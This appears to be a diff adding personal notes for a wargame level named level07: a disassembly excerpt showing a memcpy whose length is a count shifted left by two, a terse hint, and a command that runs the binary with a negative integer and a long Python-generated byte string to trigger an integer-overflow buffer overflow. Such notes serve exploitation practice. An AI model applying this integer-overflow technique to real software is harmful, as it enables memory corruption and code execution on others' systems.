@@ -1,0 +1,14 @@
+0x08048446 <+50>:	mov    -0xc(%ebp),%eax
+0x08048449 <+53>:	shl    $0x2,%eax
+0x0804844c <+56>:	mov    %eax,0x8(%esp)
+0x08048450 <+60>:	mov    0xc(%ebp),%eax
+0x08048453 <+63>:	add    $0x8,%eax
+0x08048456 <+66>:	mov    (%eax),%eax
+0x08048458 <+68>:	mov    %eax,0x4(%esp)
+0x0804845c <+72>:	lea    -0x48(%ebp),%eax
+0x0804845f <+75>:	mov    %eax,(%esp)
+0x08048462 <+78>:	call   0x8048334 <memcpy@plt>
+
+shl from sizeof we need << 2 on 3 steps then easy ->
+
+./level07 MININT $(python -c "print '\x46\x4c\x4f\x57'*100"
